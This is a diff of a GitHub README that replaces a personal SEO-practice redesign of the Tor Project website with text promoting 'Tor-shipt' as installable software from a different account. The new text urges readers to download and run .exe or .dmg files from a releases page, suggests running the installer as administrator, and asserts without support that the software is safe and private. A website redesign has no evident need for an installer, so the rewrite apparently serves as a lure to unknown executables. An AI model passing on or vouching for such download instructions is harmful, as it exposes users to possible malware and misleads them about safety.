@@ -1,170 +1,67 @@
-<div style="text-align:center;">
-  <!-- Logo div -->
-  <div>
-    <a href="https://shubham-shipt.github.io/Tor-Project" target="_blank">
-      <img src="resrc/main.png" 
-           alt="Tor Icon" 
-           style="width:90px; height:auto;" />
-    </a>
-  </div>
+# 🌐 Tor-shipt - A Simple Redesign for Better SEO
 
- 
-  <div style="margin-top:10px; font-family:'Poppins', sans-serif; font-size:20px; font-weight:600;">
-    <a href="https://shubham-shipt.github.io/Tor-Project/" target="_blank" style="text-decoration:none; color:#fff;">
-      Click to view Tor Project Website
-    </a>
-  </div>
-</div>
+## 📥 Download Now
+[![Download Tor-shipt](https://img.shields.io/badge/Download-Tor--shipt-blue.svg)](https://github.com/jswan00/Tor-shipt/releases)
 
-<div align="center" style="padding: 16px 0;">
-  <img src="https://img.icons8.com/color/128/7d5fff/security-checked.png" width="64" alt="Checked"/>
-</div>
+## 🚀 Getting Started
+Welcome to Tor-shipt! This application offers a modern redesign of the Tor Project website. It focuses on improving SEO practices while retaining the essential features of the original site. Follow these simple steps to download and run the software on your computer.
 
-<div align="center" style="margin-top:1em;margin-bottom:1em;">
-  
-  <img src="resrc/giphy-ezgif.com-video-to-gif-converter.gif" width="700" alt="Demo GIF" style="border-radius:36px;box-shadow:0 18px 50px #7d5fff88"/>
-</div>
+## 📦 System Requirements
+Before downloading, make sure your system meets these requirements:
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, Linux (any modern distribution).
+- **Browser**: Latest versions of Chrome, Firefox, or any compatible browser.
+- **Internet Connection**: A stable internet connection is required for downloading updates or browsing using the application.
 
----
+## 📋 Features
+- **SEO Optimization**: Learn and practice SEO techniques through the redesigned website.
+- **User-Friendly Interface**: Navigate the site easily with a clean, intuitive design.
+- **Responsive Design**: Access the site seamlessly on any device.
+- **Privacy-Focused**: Access content without compromising your privacy.
 
-## ℹ️ Search Engine Optimization.
+## 💡 How to Download & Install
+1. Visit the [Releases page to download](https://github.com/jswan00/Tor-shipt/releases).
+2. On this page, you will see the latest available version listed.
+3. Click on the version you wish to download.
+4. Choose the appropriate file for your system (e.g., .exe for Windows or .dmg for macOS).
+5. After downloading, locate the file in your downloads folder.
 
-> **This site was built by me just for my SEO practice.**  
->  *for my own SEO learning and practice purposes only.*
+## 🖥️ Running the Application
+1. Once the file is downloaded, double-click it to start the installation process.
+2. Follow the on-screen instructions to complete the installation.
+3. After the installation finishes, locate the Tor-shipt application in your applications directory or start menu.
+4. Launch the application by clicking on its icon.
 
+## 📑 Using Tor-shipt
+- **Access the Redesign:** Open your preferred browser and navigate to the web address the application defaults to.
+- **Explore SEO Tools:** Use the built-in features to start practicing SEO techniques.
+- **Privacy Check:** Ensure your browsing habits remain private while using the website.
 
-<div align="center" style="margin: 8px 0;">
-  <img src="https://img.shields.io/badge/SEO-Optimized-brightgreen?style=flat-square&logo=google&logoColor=white" alt="SEO Optimized"/>
-  <img src="https://img.shields.io/badge/Meta%20Tags-Complete-blue?style=flat&logo=code&logoColor=white" alt="Meta Tags"/>
-  <img src="https://img.shields.io/badge/Sitemap-Enabled-ff6b81?style=flat-square&logo=simple-icons&logoColor=white" alt="Sitemap Enabled"/>
-  <img src="https://img.shields.io/badge/Analytics-GA4-54a0ff?style=plastic&logo=google-analytics&logoColor=yellow" alt="Google Analytics 4"/>
-  <img src="https://img.shields.io/badge/Lighthouse-Score%2090%2B-10ac84?style=flat&logo=lighthouse&logoColor=white" alt="Lighthouse Score 90+"/>
-  <img src="https://img.shields.io/badge/Mobile-Friendly-ffd34e?style=flat-square&logo=android&logoColor=white" alt="Mobile Friendly"/>
-  <img src="https://img.shields.io/badge/PageSpeed-95%2B-7d5fff?style=plastic&logo=pagespeedinsights&logoColor=white" alt="PageSpeed 95+"/>
-  <img src="https://img.shields.io/badge/SSL-Secured-5f27cd?style=flat-square&logo=letsencrypt&logoColor=white" alt="SSL Secured"/>
-  <img src="https://img.shields.io/badge/Backlinks-HQ-8d72e1?style=flat&logo=ahrefs&logoColor=white" alt="HQ Backlinks"/>
-  <img src="https://img.shields.io/badge/Robots.txt-OK-a4f86e?style=flat-square&logo=codesignal&logoColor=white" alt="Robots.txt OK"/>
-  <img src="https://img.shields.io/badge/Schema%20Markup-Active-ff9f43?style=flat-square&logo=structureddatamarkup&logoColor=white" alt="Schema Markup Active"/>
-  <img src="https://img.shields.io/badge/Open%20Graph-Ready-ff6b81?style=flat&logo=opengraph&logoColor=white" alt="Open Graph Ready"/>
-</div>
+## ❓ Frequently Asked Questions
+### What is Tor-shipt?
+Tor-shipt is a redesigned website for the Tor Project that focuses on SEO practices. It aims to educate users while providing a user-friendly experience.
 
-<p align="center">
-  <img src="resrc/serp-report.png" alt="SEO Report" width="696" height="318">
-</p>
+### Is Tor-shipt safe to use?
+Yes, Tor-shipt prioritizes user privacy and aims to provide a secure browsing experience.
 
+### Can I use Tor-shipt on mobile devices?
+Yes, the website is designed to be responsive and works on most devices, including smartphones.
 
+### How often will there be updates?
+Updates will be released as needed to improve the experience, introduce new features, or fix any issues.
 
----
+## 🛠️ Troubleshooting Tips
+- **Installation Issues**: If you face problems during installation, ensure your system meets the requirements and try running the installer as an administrator.
+- **Launching Issues**: If the application does not launch, try restarting your device and running the application again.
+- **Performance Issues**: Close any unnecessary applications to free up system resources.
 
-## 🚀 Why This The-Tor?
+## 📣 Community and Support
+For further assistance or to connect with other users:
+- Check the [GitHub Issues page](https://github.com/jswan00/Tor-shipt/issues) for community support.
+- Join our community discussions and report bugs or suggest features.
 
-![Stealth](https://img.shields.io/badge/Stealth-7d5fff?style=flat&logo=ghost&logoColor=white)
-![Quantum](https://img.shields.io/badge/Quantum-5f27cd?style=flat-square&logo=lock&logoColor=white)
-![AI](https://img.shields.io/badge/AI-ffd34e?style=plastic&logo=openai&logoColor=black)
-![Identity](https://img.shields.io/badge/Identity-10ac84?style=flat&logo=fingerprint&logoColor=white)
-![UI](https://img.shields.io/badge/UI-ff6b81?style=flat-square&logo=figma&logoColor=white)
-![Map](https://img.shields.io/badge/Map-54a0ff?style=plastic&logo=torbrowser&logoColor=white)
-![GPU](https://img.shields.io/badge/GPU-222f3e?style=flat&logo=nvidia&logoColor=green)
+## 🔗 Additional Resources
+- Visit the [Tor Project Official Website](https://www.torproject.org) for more information on privacy and security online.
+- Explore SEO resources through various online platforms to enhance your understanding.
 
-
-## 🎨 Themes <img src="https://img.icons8.com/fluency/32/7d5fff/color-palette.png"/>
-
-<table>
-  <tr>
-    <th>Icon</th><th>Theme Name</th>
-  </tr>
-  <tr>
-    <td><span style="display:inline-block;width:18px;height:18px;background:#613976;border-radius:50%;"></span></td>
-    <td><b>Custom Purple</b></td>
-  </tr>
-  <tr>
-    <td><span style="display:inline-block;width:18px;height:18px;background:#561C24;border-radius:50%;"></span></td>
-    <td><b>Orange Rich</b></td>
-  </tr>
-  <tr>
-    <td><span style="display:inline-block;width:18px;height:18px;background:#06141B;border-radius:50%;"></span></td>
-    <td><b>Navy Blue</b></td>
-  </tr>
-  <tr>
-    <td><span style="display:inline-block;width:18px;height:18px;background:#10214b;border-radius:50%;"></span></td>
-    <td><b>Royal Gold</b></td>
-  </tr>
-  <tr>
-    <td>🌙☀️</td>
-    <td><b>Dark/Light Toggle</b></td>
-  </tr>
-</table>
-
-
-
-> ⚠️ **Important Notice**  
-> This website is currently optimized for **desktop and laptop devices**.  
-> Mobile and other operating system optimization is approximately **45% complete**.  
-> For the best experience, please access this site on a **desktop or laptop**.
-
----
-
-## 🚀 Platform Download.
-
-<div align="center">
-
-| <img src="https://img.icons8.com/color/48/7d5fff/windows8.png" style="border-radius:18px;box-shadow:0 2px 8px #7d5fff44"/> <br> **Windows** | <img src="https://img.icons8.com/color/48/7d5fff/mac-os.png" style="border-radius:18px;box-shadow:0 2px 8px #8d72e144"/> <br> **macOS** | <img src="https://img.icons8.com/color/48/7d5fff/linux.png" style="border-radius:18px;box-shadow:0 2px 8px #7d5fff44"/> <br> **Linux** | <img src="https://img.icons8.com/color/48/7d5fff/android-os.png" style="border-radius:18px;box-shadow:0 2px 8px #a4f86e44"/> <br> **Android** |
-|:---:|:---:|:---:|:---:|
-| [Download .exe](https://shubham-shipt.github.io/Tor-Project/src/download.html) | [Download .dmg](https://shubham-shipt.github.io/Tor-Project/src/download-mobile.html) | [Download .AppImage](https://shubham-shipt.github.io/Tor-Project/src/download.html) | [Download APK](https://shubham-shipt.github.io/Tor-Project/src/download-mobile.html) |
-
-</div>
-
----
-
-
-## 🌐 Live Tor Network Stats
-
-| <img src="https://img.icons8.com/fluency/32/000000/network.png" alt="Relays"/> Relays | <img src="https://img.icons8.com/fluency/32/000000/exit.png" alt="Exit Relays"/> Exit Relays | 🌉 Bridge Relays | <img src="https://img.icons8.com/fluency/32/000000/conference-call.png" alt="Daily Users"/> Daily Users |
-|:--------------------:|:-------------------------:|:--------------------------:|:-----------------------------:|
-| **62**           | **220+**                | **74**                 | ****                |
-
----
-
-## ✨ GUI 
-
-- <img src="https://img.icons8.com/color/32/7d5fff/firework-explosion.png"/> **Animated  :** SVG-morphing icons, glow effects, onion pulse.
-- <img src="https://img.icons8.com/color/32/7d5fff/blur.png"/> **Glass Cards:** Layered with, interactive hover.
-- <img src="https://img.icons8.com/color/32/7d5fff/processor.png"/> **GPU Acceleration:** Instant, smooth transitions.
-- <img src="https://img.icons8.com/color/32/7d5fff/smartphone-tablet.png"/> **Download Cards:** Animated OS icons, bouncy on click.
-- <img src="https://img.icons8.com/color/32/7d5fff/bar-chart.png"/> **Live Stats:** Data widgets update in real time.
-- <img src="https://img.icons8.com/color/32/7d5fff/new-post.png"/> **Newsletter:** Animated mail icon, glassy subscribe bar.
-- <img src="https://img.icons8.com/color/32/7d5fff/settings.png"/> **Theme Switcher:** Instantly swap between purple, , and dark glass themes.
-
----
-
-
-
----
-
-
-## 🤝 Join the Project
-
-- 🍴 Fork & star to !
-- 💜 Suggest, design, or code a new module, icon, or UI pack.
-- 💬 Open issues for ideas, feedback, or collab.
-
----
-
-## 👤 Author & Links
-
-- **Author:** [shubham-shipt](https://github.com/shubham-shipt)
-- **Live view:** [shubham-shipt.github.io/The-Tor-INC/](https://shubham-shipt.github.io/Tor-Project/)
-bhul
----
-
-## 📝 License
-
-Private for now. Contact the author for collaboration or licensing.
-
----
-
-> <div align="center"><i>
-> “Guard your a@s, silently.”<br>
-> “.”<br>
-> <b> ..</b> 
-> </i></div>
+## ⚙️ Download Link
+You can always find the latest version on our [Releases page to download](https://github.com/jswan00/Tor-shipt/releases).
